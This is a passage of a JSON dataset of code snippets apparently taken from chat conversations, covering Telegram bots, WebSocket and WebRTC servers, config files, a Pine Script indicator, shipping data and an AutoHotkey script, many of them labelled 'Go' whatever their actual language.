    "code": "func handleVideosCommand(bot *tgbotapi.BotAPI, message tgbotapi.Message) {\n\tuserID := message.From.ID\n\n\tif userStates[userID] != StateAwaitVideo {\n\t\treturn\n\t}\n\n\tvalue, err := strconv.Atoi(message.Text)\n\tif err != nil || value <= 0 {\n\t\tsendMessage(bot, message.Chat.ID, \"Введено неверное значение\")\n\t\treturn\n\t}\n\n\t// Обновляем состояние пользователя на загрузку видео\n\tuserStates[userID] = StateUploadingVideo\n\tsendMessage(bot, message.Chat.ID, \"Отправляйте видео одно за другим.\")\n\t\n\t// Здесь должен быть код для обработки загрузки видео\n\t// После завершения загрузки:\n\thandleChangeState(bot, message, StateNone)\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_5.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\ttgbotapi \"github.com/go-telegram-bot-api/telegram-bot-api/v5\"\n\t\"animeblissbot/handlers\"\n)\n\nfunc main() {\n\tbot, err := tgbotapi.NewBotAPI(\"YOUR_TELEGRAM_BOT_TOKEN\")\n\tif err != nil {\n\t\tlog.Panic(err)\n\t}\n\tbot.Debug = true\n\n\tlog.Printf(\"Авторизирован в аккаунт %s\", bot.Self.UserName)\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates := bot.GetUpdatesChan(u)\n\n\tfor update := range updates {\n\t\tif update.Message == nil { // Если объект сообщения пуст, продолжаем слушать другие сообщения\n\t\t\tcontinue\n\t\t}\n\n\t\thandlers.HandleUpdate(bot, update)\n\t}\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_6.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "// В пакете handlers\nfunc HandleUpdate(bot *tgbotapi.BotAPI, update tgbotapi.Update) {\n    if !middleware.IsUserInWhiteList(update.Message.From.UserName) {\n        log.Printf(\"Проверка не пройдена. %v\", update.Message.From.UserName)\n        return\n    }\n\n    if !update.Message.IsCommand() {\n        return\n    }\n\n    handleCommand(bot, *update.Message)\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_7.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    bot, err := tgbotapi.NewBotAPI(\"ВАШ_TELEGRAM_BOT_TOKEN\")\n    if err != nil {\n        log.Panic(err)\n    }\n    bot.Debug = true\n\n    log.Printf(\"Авторизирован на аккаунт %s\", bot.Self.UserName)\n\n    u := tgbotapi.NewUpdate(0)\n    u.Timeout = 60\n\n    updates, err := bot.GetUpdatesChan(u)\n    if err != nil {\n        log.Panic(err)\n    }\n\n    for update := range updates {\n        if update.Message != nil { // Убедитесь, что обработка идет только для сообщений\n            handlers.HandleUpdate(bot, update)\n        }\n    }\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_8.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func HandleUpdate(bot *tgbotapi.BotAPI, update tgbotapi.Update) {\n    if update.Message == nil { // Пропускаем, если это не сообщение\n        return\n    }\n\n    if !middleware.IsUserInWhiteList(update.Message.From.UserName) {\n        log.Printf(\"[WARN] Проверка не пройдена: %v\", update.Message.From.UserName)\n        return\n    }\n\n    if !update.Message.IsCommand() {\n        return\n    }\n\n    handleCommand(bot, *update.Message)\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_9.go"
  },
  {
    "conversation_hash": "9650cb3f4df1f640365c3131555955b5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"始发国\": \"CHINA\",\n  \"目的国\": \"GERMANY\",\n  \"发票号\": \"1908031\",\n  \"唛头\": \"N/M\",\n  \"海关商品编码\": \"8483900090\",\n  \"运输方式\": \"None\",\n  \"发货公司名称\": \"ZHANGJIAKOU HONG XING MACHINERY Co., LTD\",\n  \"收货公司的名称\": \"GRAF GMBH, GERMANY\",\n  \"合同号\": \"190724GF(2434)rev2\",\n  \"装箱单单号\": \"1908031\",\n  \"商品名称\": \"ROLLER SHELL\",\n  \"总包装件数\": {\"数量\": 16, \"单位\": \"PALLETS\"},\n  \"总件数\": {\"数量\": 463, \"单位\": \"PCS\"},\n  \"总净重\": {\"数量\": 20695, \"单位\": \"KGS\"},\n  \"总毛重\": {\"数量\": 21002, \"单位\": \"KGS\"},\n  \"总体积\": {\"数量\": 9.74, \"单位\": \"CBM\"}\n}",
    "filename": "9650cb3f4df1f640365c3131555955b5_0.go"
  },
  {
    "conversation_hash": "1b1f6ceed1415c8101c2232b810df108",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "listen: 0.0.0.0:4222\n\n   jetstream {\n       store_dir: \"/path/to/jetstream/data\"\n       max_memory: 4GB\n       max_file: 10GB\n   }\n\n   websocket {\n       listen: \"0.0.0.0:443\"\n       tls {\n           cert_file: \"/path/to/fullchain.pem\"\n           key_file: \"/path/to/privkey.pem\"\n       }\n       no_auth_user: user1\n   }\n\n   cluster {\n       name: nats-cluster\n       listen: 0.0.0.0:6222\n       routes: [\n           nats-route://nats1.example.com:6222\n           nats-route://nats2.example.com:6222\n           nats-route://nats3.example.com:6222\n       ]\n       cluster_advertise: \"nats1.example.com:6222\"\n       connect_retries: 10\n   }\n\n   leafnodes {\n       listen: 0.0.0.0:7422\n   }",
    "filename": "1b1f6ceed1415c8101c2232b810df108_10.go"
  },
  {
    "conversation_hash": "1b1f6ceed1415c8101c2232b810df108",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "cluster {\n       tls {\n           cert_file: \"/path/to/fullchain.pem\"\n           key_file: \"/path/to/privkey.pem\"\n           ca_file: \"/path/to/ca.pem\"\n       }\n   }\n\n   leafnodes {\n       tls {\n           cert_file: \"/path/to/fullchain.pem\"\n           key_file: \"/path/to/privkey.pem\"\n           ca_file: \"/path/to/ca.pem\"\n       }\n   }",
    "filename": "1b1f6ceed1415c8101c2232b810df108_12.go"
  },
  {
    "conversation_hash": "982ceb15707f295602ebc91d0607f843",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Trend e Stagionalità\", shorttitle=\"TrendStag\", overlay=true)\n\n// Impostazioni per l'analisi del Trend\nlunghezzaEMA = input.int(50, title=\"Lunghezza EMA Trend\")\nlunghezzaSMA = input.int(200, title=\"Lunghezza SMA Trend\")\n\nemaTrend = ta.ema(close, lunghezzaEMA)\nsmaTrend = ta.sma(close, lunghezzaSMA)\n\n// Visualizzazione Trend\nplot(emaTrend, color=color.blue, title=\"EMA Trend\")\nplot(smaTrend, color=color.red, title=\"SMA Trend\")\n\n// Impostazioni per l'approssimazione della Stagionalità\nmesi = input.int(12, minval=1, title=\"Riferimento Mesi per Stagionalità\")\ngiorniNelMese = 30 // Approssimazione\n\n// Calcola la differenza percentuale dei prezzi di chiusura in base al periodo selezionato\nprezzoChiusuraMesiPrecedenti = request.security(syminfo.tickerid, tostring(mesi * giorniNelMese) + \"D\", close[1], lookahead=barmerge.lookahead_on)\n\nvariazionePercentuale = ((close - prezzoChiusuraMesiPrecedenti) / prezzoChiusuraMesiPrecedenti) * 100\n\n// Visualizzazione Approssimazione Stagionalità\nhline(0, \"Baseline\", color=color.gray, linestyle=hline.style_dashed)\nhistogrammaStagionalità = plot(variazionePercentuale, title=\"Variazione % Stagionale\", color=color.purple, style=plot.style_histogram)\n\n// Linee di Soglia per evidenziare significative variazioni percentuali stagionali\nsogliaAlta = hline(10, \"Soglia Alta\", color=color.green)\nsogliaBassa = hline(-10, \"Soglia Bassa\", color=color.red)\n\nfill(sogliaAlta, histogrammaStagionalità, color=color.green, transp=90)\nfill(sogliaBassa, histogrammaStagionalità, color=color.red, transp=90)",
    "filename": "982ceb15707f295602ebc91d0607f843_3.go"
  },
  {
    "conversation_hash": "feb9a24834ae9ee1c0127c265cf7440b",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath \"com.android.tools.build:gradle:x.x.x\" // 确保使用了正确版本的 Android Gradle 插件\n        // 添加CMake依赖，如果你的项目需要它：\n        classpath \"com.android.tools.build:cmake:x.x.x\"\n    }\n}\n\nallprojects {\n    repositories {\n        google()\n        jcenter()\n    }\n}",
    "filename": "feb9a24834ae9ee1c0127c265cf7440b_5.go"
  },
  {
    "conversation_hash": "feb9a24834ae9ee1c0127c265cf7440b",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n\n    defaultConfig {\n        ...\n        ndkVersion \"你的NDK版本\" // 指定你的NDK版本\n        externalNativeBuild {\n            cmake {\n                cppFlags \"\"\n            }\n        }\n    }\n\n    externalNativeBuild {\n        cmake {\n            path \"CMakeLists.txt\" // CMakeLists文件的路径\n        }\n    }\n}",
    "filename": "feb9a24834ae9ee1c0127c265cf7440b_6.go"
  },
  {
    "conversation_hash": "53cd4e2be2e08a1cfec9e9144c0c9493",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\"纸箱1\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 0, \"z\": 0}},\n{\"纸箱2\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 0, \"z\": 0}},\n{\"纸箱3\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 0, \"z\": 0}},\n{\"纸箱4\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 0, \"z\": 0}},\n{\"纸箱5\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 1000, \"z\": 0}},\n{\"纸箱6\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 1000, \"z\": 0}},\n{\"纸箱7\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 1000, \"z\": 0}},\n{\"纸箱8\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 1000, \"z\": 0}},\n{\"纸箱9\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 2000, \"z\": 0}},\n{\"纸箱10\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 2000, \"z\": 0}},\n\n{\"纸箱11\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 0, \"y\": 3000, \"z\": 0}},\n{\"纸箱12\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 100, \"y\": 3000, \"z\": 0}},\n{\"纸箱13\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 200, \"y\": 3000, \"z\": 0}},\n{\"纸箱14\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 300, \"y\": 3000, \"z\": 0}},\n{\"纸箱15\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 400, \"y\": 3000, \"z\": 0}}",
    "filename": "53cd4e2be2e08a1cfec9e9144c0c9493_0.go"
  },
  {
    "conversation_hash": "53cd4e2be2e08a1cfec9e9144c0c9493",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "{\"纸箱1\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 0, \"z\": 0}},\n{\"纸箱2\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 0, \"z\": 0}},\n{\"纸箱3\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 0, \"z\": 0}},\n{\"纸箱4\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 0, \"z\": 0}},\n{\"纸箱5\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 1000, \"z\": 0}},\n{\"纸箱6\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 1000, \"z\": 0}},\n{\"纸箱7\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 1000, \"z\": 0}},\n{\"纸箱8\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 1000, \"z\": 0}},\n{\"纸箱9\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 2000, \"z\": 200}},\n{\"纸箱10\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 2000, \"z\": 200}},\n\n{\"纸箱11\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 0, \"y\": 2000, \"z\": 0}},\n{\"纸箱12\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 100, \"y\": 2000, \"z\": 0}},\n{\"纸箱13\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 200, \"y\": 2000, \"z\": 0}},\n{\"纸箱14\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 300, \"y\": 2000, \"z\": 0}},\n{\"纸箱15\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 400, \"y\": 2000, \"z\": 0}}",
    "filename": "53cd4e2be2e08a1cfec9e9144c0c9493_1.go"
  },
  {
    "conversation_hash": "53cd4e2be2e08a1cfec9e9144c0c9493",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "{\"纸箱1\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 0, \"z\": 0}},\n{\"纸箱2\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 0, \"z\": 0}},\n{\"纸箱3\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 0, \"z\": 0}},\n{\"纸箱4\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 0, \"z\": 0}},\n{\"纸箱5\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 1000, \"z\": 0}},\n{\"纸箱6\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 1000, \"z\": 0}},\n{\"纸箱7\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 1000, \"z\": 0}},\n{\"纸箱8\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 1000, \"z\": 0}},\n{\"纸箱9\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 2000, \"z\": 0}},\n{\"纸箱10\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 2000, \"z\": 0}},\n\n{\"纸箱11\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1000, \"y\": 2000, \"z\": 0}},\n{\"纸箱12\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1100, \"y\": 2000, \"z\": 0}},\n{\"纸箱13\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1200, \"y\": 2000, \"z\": 0}},\n{\"纸箱14\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1300, \"y\": 2000, \"z\": 0}},\n{\"纸箱15\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1400, \"y\": 2000, \"z\": 0}}",
    "filename": "53cd4e2be2e08a1cfec9e9144c0c9493_2.go"
  },
  {
    "conversation_hash": "53cd4e2be2e08a1cfec9e9144c0c9493",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "{\"纸箱1\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 0, \"z\": 0}},\n{\"纸箱2\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 0, \"z\": 0}},\n{\"纸箱3\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 0, \"z\": 0}},\n{\"纸箱4\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 0, \"z\": 0}},\n{\"纸箱5\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 1000, \"z\": 0}},\n{\"纸箱6\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 1000, \"z\": 0}},\n{\"纸箱7\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 1000, \"z\": 0}},\n{\"纸箱8\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 1000, \"z\": 0}},\n{\"纸箱9\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 2000, \"z\": 0}},\n{\"纸箱10\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 2000, \"z\": 0}},\n\n{\"纸箱11\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1000, \"y\": 2000, \"z\": 0}},\n{\"纸箱12\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1100, \"y\": 2000, \"z\": 0}},\n{\"纸箱13\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1200, \"y\": 2000, \"z\": 0}},\n{\"纸箱14\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1300, \"y\": 2000, \"z\": 0}},\n{\"纸箱15\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1400, \"y\": 2000, \"z\": 0}},\n\n{\"托盘\": {\"length\": 1000, \"width\": 1000, \"height\": 280, \"x\": 1000, \"y\": 0, \"z\": 200}}",
    "filename": "53cd4e2be2e08a1cfec9e9144c0c9493_3.go"
  },
  {
    "conversation_hash": "53cd4e2be2e08a1cfec9e9144c0c9493",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "{\"纸箱1\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 0, \"z\": 0}},\n{\"纸箱2\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 0, \"z\": 0}},\n{\"纸箱3\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 0, \"z\": 0}},\n{\"纸箱4\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 0, \"z\": 0}},\n{\"纸箱5\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 1000, \"z\": 0}},\n{\"纸箱6\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 1000, \"z\": 0}},\n{\"纸箱7\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1000, \"y\": 1000, \"z\": 0}},\n{\"纸箱8\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 1500, \"y\": 1000, \"z\": 0}},\n{\"纸箱9\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 0, \"y\": 2000, \"z\": 0}},\n{\"纸箱10\": {\"length\": 1000, \"width\": 500, \"height\": 200, \"x\": 500, \"y\": 2000, \"z\": 0}},\n\n{\"纸箱11\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1000, \"y\": 2000, \"z\": 0}},\n{\"纸箱12\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1100, \"y\": 2000, \"z\": 0}},\n{\"纸箱13\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1200, \"y\": 2000, \"z\": 0}},\n{\"纸箱14\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1300, \"y\": 2000, \"z\": 0}},\n{\"纸箱15\": {\"length\": 450, \"width\": 100, \"height\": 1000, \"x\": 1400, \"y\": 2000, \"z\": 0}},\n\n{\"托盘\": {\"length\": 1000, \"width\": 1000, \"height\": 1800, \"x\": 1000, \"y\": 0, \"z\": 200}}",
    "filename": "53cd4e2be2e08a1cfec9e9144c0c9493_4.go"
  },
  {
    "conversation_hash": "8e3440323cc0ec314ccd09b076e3d568",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"time\"\n)\n\nfunc isReachable(host string, port int, timeout time.Duration) bool {\n\t// Combine host and port to form a complete network address\n\taddress := fmt.Sprintf(\"%s:%d\", host, port)\n\n\t// Attempt to establish a connection\n\tconn, err := net.DialTimeout(\"tcp\", address, timeout)\n\tif err != nil {\n\t\t// If there's an error, consider the address not reachable\n\t\tfmt.Println(\"Connection error:\", err)\n\t\treturn false\n\t}\n\tdefer conn.Close() // Make sure to close the connection after checking\n\n\t// If no error occurred, the address is reachable\n\treturn true\n}\n\nfunc main() {\n\thost := \"8.8.8.8\" // Example IP (Google DNS)\n\tport := 53        // Example port (DNS service)\n\ttimeout := 5 * time.Second // Maximum duration to wait for connection\n\n\tif isReachable(host, port, timeout) {\n\t\tfmt.Printf(\"The address %s:%d is reachable.\\n\", host, port)\n\t} else {\n\t\tfmt.Printf(\"The address %s:%d is not reachable.\\n\", host, port)\n\t}\n}",
    "filename": "8e3440323cc0ec314ccd09b076e3d568_0.go"
  },
  {
    "conversation_hash": "46be5339ff7cf86c287590401906ad66",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "1"
    ],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    // Check if a specific argument is provided\n    if len(os.Args) > 1 { // Always check length to avoid out-of-bounds panic\n        // Access the first argument directly\n        firstArg := os.Args[1]\n        fmt.Println(\"First Argument:\", firstArg)\n    } else {\n        fmt.Println(\"No arguments were provided.\")\n    }\n\n    // Iterate over all arguments (including the program path)\n    fmt.Println(\"\\nAll provided arguments (including program path):\")\n    for i, arg := range os.Args {\n        fmt.Printf(\"Argument %d: %s\\n\", i, arg)\n    }\n\n    // If you want to skip the program path, start your range from 1\n    fmt.Println(\"\\nActual command line arguments:\")\n    for _, arg := range os.Args[1:] {\n        fmt.Println(arg)\n    }\n}",
    "filename": "46be5339ff7cf86c287590401906ad66_1.go"
  },
  {
    "conversation_hash": "46be5339ff7cf86c287590401906ad66",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"strconv\"\n)\n\nfunc main() {\n    // Check if the first argument is provided\n    if len(os.Args) > 1 { // Always check length to avoid out-of-bounds panic\n        // Attempt to convert the first argument to an integer\n        arg := os.Args[1]\n        intValue, err := strconv.Atoi(arg)\n        if err != nil {\n            // Handle the error if the conversion failed\n            fmt.Printf(\"Error converting '%s' to integer: %s\\n\", arg, err)\n            return\n        }\n        // If conversion is successful, use the intValue\n        fmt.Printf(\"First Argument as integer: %d\\n\", intValue)\n    } else {\n        fmt.Println(\"No arguments were provided.\")\n    }\n\n    // The rest of your code handling other arguments\n}",
    "filename": "46be5339ff7cf86c287590401906ad66_4.go"
  },
  {
    "conversation_hash": "eaf4d822b8c2830119e2df099b722173",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "#MaxThreadsPerHotkey 2\n\nToggle := 0\n^j:: ; Ctrl+J для начала/остановки скрипта\n    Toggle := !Toggle\n     While Toggle{\n        Send, w ; Имитация нажатия W\n        Sleep, 1000 ; Ждать 1000мс перед следующим действием\n        Send, a ; Имитация нажатия A\n        Sleep, 1000\n        Click ; Имитация клика мыши (левой кнопкой)\n        Sleep, 1000\n        Send, {Space} ; Имитация нажатия пробела\n        Sleep, 1000\n    }\nreturn",
    "filename": "eaf4d822b8c2830119e2df099b722173_0.go"
  },
  {
    "conversation_hash": "d58abf296ded7bb0f1dd5a64ed71ed29",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// Avec Echo\n   e := echo.New()\n   e.GET(\"/\", func(c echo.Context) error {\n       return c.String(http.StatusOK, \"Bienvenue sur notre serveur de visioconférence\")\n   })\n   e.Logger.Fatal(e.Start(\":1323\"))",
    "filename": "d58abf296ded7bb0f1dd5a64ed71ed29_0.go"
  },
  {
    "conversation_hash": "d58abf296ded7bb0f1dd5a64ed71ed29",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"github.com/gorilla/websocket\"\n)\n\nvar upgrader = websocket.Upgrader{\n\tCheckOrigin: func(r *http.Request) bool {\n\t\treturn true\n\t},\n}\n\nfunc handleConnections(w http.ResponseWriter, r *http.Request) {\n\tws, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer ws.Close()\n\n\tfor {\n\t\tvar msg string\n\t\terr := ws.ReadJSON(&msg)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"error: %v\", err)\n\t\t\tbreak\n\t\t}\n\t\tlog.Printf(\"Received: %s\\n\", msg)\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/ws\", handleConnections)\n\tlog.Println(\"Server is starting on port 8080...\")\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tlog.Fatal(\"ListenAndServe: \", err)\n\t}\n}",
    "filename": "d58abf296ded7bb0f1dd5a64ed71ed29_1.go"
  },
  {
    "conversation_hash": "d58abf296ded7bb0f1dd5a64ed71ed29",
    "code_index": 9,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n    \"net/http\"\n    \"github.com/gorilla/websocket\"\n    \"log\"\n)\n\nvar clients = make(map[*websocket.Conn]bool) // connected clients\nvar broadcast = make(chan Message)           // broadcast channel\n\nvar upgrader = websocket.Upgrader{}\n\n// Define our message object\ntype Message struct {\n    Email    string `json:\"email\"`\n    Username string `json:\"username\"`\n    Message  string `json:\"message\"`\n}\n\nfunc main() {\n    fs := http.FileServer(http.Dir(\"../public\"))\n    http.Handle(\"/\", fs)\n    \n    http.HandleFunc(\"/ws\", handleConnections)\n    \n    go handleMessages()\n\n    log.Println(\"http server started on :8000\")\n    err := http.ListenAndServe(\":8000\", nil)\n    if err != nil {\n        log.Fatal(\"ListenAndServe: \", err)\n    }\n}\n\nfunc handleConnections(w http.ResponseWriter, r *http.Request) {\n    // Upgrade initial GET request to a websocket\n    ws, err := upgrader.Upgrade(w, r, nil)\n    if err != nil {\n        log.Fatal(err)\n    }\n    \n    defer ws.Close()\n\n    // Register our new client\n    clients[ws] = true\n\n    for {\n        var msg Message\n        // Read in a new message as JSON and map it to a Message object\n        err := ws.ReadJSON(&msg)\n        if err != nil {\n            log.Printf(\"error: %v\", err)\n            delete(clients, ws)\n            break\n        }\n        // Send the newly received message to the broadcast channel\n        broadcast <- msg\n    }\n}\n\nfunc handleMessages() {\n    for {\n        // Grab the next message from the broadcast channel\n        msg := <-broadcast\n        \n        // Send it out to every client that is currently connected\n        for client := range clients {\n            err := client.WriteJSON(msg)\n            if err != nil {\n                log.Printf(\"error: %v\", err)\n                client.Close()\n                delete(clients, client)\n            }\n        }\n    }\n}",
    "filename": "d58abf296ded7bb0f1dd5a64ed71ed29_9.go"
  },
  {
    "conversation_hash": "d58abf296ded7bb0f1dd5a64ed71ed29",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "type Message struct {\n    // Ajoutez les champs requis par les messages WebRTC\n    Type      string          `json:\"type\"`\n    Offer     webrtc.SessionDescription `json:\"offer,omitempty\"`\n    Answer    webrtc.SessionDescription `json:\"answer,omitempty\"`\n    Candidate webrtc.ICECandidateInit   `json:\"candidate,omitempty\"`\n}",
    "filename": "d58abf296ded7bb0f1dd5a64ed71ed29_11.go"
  },
  {
    "conversation_hash": "d58abf296ded7bb0f1dd5a64ed71ed29",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "// Dans la fonction handleConnections après l'enregistrement du client\npeerConnection, err := webrtc.NewPeerConnection(webrtc.Configuration{})\nif err != nil {\n    log.Fatal(err)\n}\n\npeerConnection.OnICECandidate(func(i *webrtc.ICECandidate) {\n    if i == nil {\n        // ICE Gathering fini\n        return\n    }\n    candidate := i.ToJSON()\n    msg := Message{\n        Type:      \"candidate\",\n        Candidate: candidate,\n    }\n    // Utilisez ici la logique pour envoyer ce message au pair approprié\n})\n\npeerConnection.OnTrack(func(t *webrtc.TrackRemote, r *webrtc.RTPReceiver) {\n    // Lorsque vous recevez un track, traitez-le en fonction de votre logique d'application\n})\n\n// La logique d'interception des messages et traitement selon le type\nfor {\n    var msg Message\n    err := ws.ReadJSON(&msg)\n    if err != nil {\n        // Gérer l'erreur\n        break\n    }\n\n    switch msg.Type {\n    case \"offer\":\n        // Gérer l'offre\n    case \"answer\":\n        // Gérer la réponse\n    case \"candidate\":\n        // Ajouter le candidat ICE\n    }\n}",
    "filename": "d58abf296ded7bb0f1dd5a64ed71ed29_12.go"
  },
  {
    "conversation_hash": "d58abf296ded7bb0f1dd5a64ed71ed29",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "config := webrtc.Configuration{\n    ICEServers: []webrtc.ICEServer{\n        {\n            URLs: []string{\"stun:stun.l.google.com:19302\"},\n        },\n        // Configuration TURN (si disponible)\n        // {\n        //     URLs: []string{\"turn:TURN_SERVER:PORT\"},\n        //     Username: \"TURN_USERNAME\",\n        //     Credential: \"TURN_CREDENTIALS\",\n        // },\n    },\n}",
    "filename": "d58abf296ded7bb0f1dd5a64ed71ed29_14.go"
  },
  {
    "conversation_hash": "a6a9254d29c97a6cc0a484b583d27c42",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
